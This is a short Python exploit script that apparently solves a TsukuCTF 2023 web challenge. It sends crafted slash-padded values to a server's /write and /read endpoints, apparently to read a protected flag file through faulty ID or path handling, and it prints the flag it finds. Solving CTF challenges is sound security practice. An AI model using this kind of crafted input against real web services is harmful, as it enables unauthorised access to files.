import re
import base64
import requests

URL = "http://133.130.100.34:31415/"

session = requests.Session()

session.get(f"{URL}")

res = session.post(f"{URL}/write", data={"content": base64.b64decode(b"////////flag")})
print(f"[POST] /write: {res.status_code}")

res = session.post(f"{URL}/read", data={"memoid": "////////fla@g"})
print(f"[POST] /read: {res.status_code}")
flag = re.search("TsukuCTF23{.*?}", res.text)
print(f"[FLAG] {flag.group()}")
